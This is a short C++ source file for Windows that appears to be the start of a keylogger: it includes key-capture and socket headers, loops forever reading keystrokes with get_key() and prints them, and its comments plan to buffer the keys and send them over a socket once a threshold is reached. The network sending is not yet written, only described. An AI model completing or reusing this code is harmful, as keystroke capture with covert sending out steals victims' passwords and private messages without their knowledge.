#include "keys.hpp"
#include "socket.hpp"

#include <iostream>
#include <windows.h>


int main(/*int argc, char* argv[]*/) { 
    
    // atexit(close_socket);

    // create_socket
    // open_socket

    std::string key;

    while( true ) { 
        
        key = get_key();
        
        std::cout << key << std::endl; 
        
        // create an array and print it out or some buffer to add to a packet that i can send
        // create socket
        // send message if threshold is exceeded
    }

    return 0;
}


